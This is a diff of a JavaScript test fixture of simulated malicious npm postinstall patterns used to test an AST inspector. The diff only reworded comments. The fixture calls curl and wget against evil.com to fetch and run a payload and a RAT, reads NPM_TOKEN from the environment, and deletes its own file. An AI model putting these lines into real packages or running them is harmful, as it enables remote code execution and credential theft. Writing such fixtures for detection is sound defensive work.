@@ -1,11 +1,11 @@
-// Simulated malicious postinstall patterns for testing AST inspector
-// Each function represents a real-world attack pattern
+// Repository-authored risk-associated patterns for testing the AST inspector.
+// These strings are synthetic and carry no incident attribution.
 
-// Pattern 1: Direct child_process exec (event-stream attack)
+// Pattern 1: Direct child_process exec
 const cp = require('child_process');
 cp.exec('curl http://evil.com/payload.sh | sh');
 
-// Pattern 2: Destructured require (most common npm attack vector)
+// Pattern 2: Destructured require plus process execution
 const { execSync } = require('child_process');
 execSync('wget http://evil.com/rat -O /tmp/rat && chmod +x /tmp/rat && /tmp/rat');
 
@@ -20,7 +20,7 @@ const secrets = {
   npm: process.env.NPM_TOKEN,
 };
 
-// Pattern 5: Self-deletion (axios RAT pattern)
+// Pattern 5: Self-deletion
 const fs = require('fs');
 fs.unlinkSync(__filename);
 
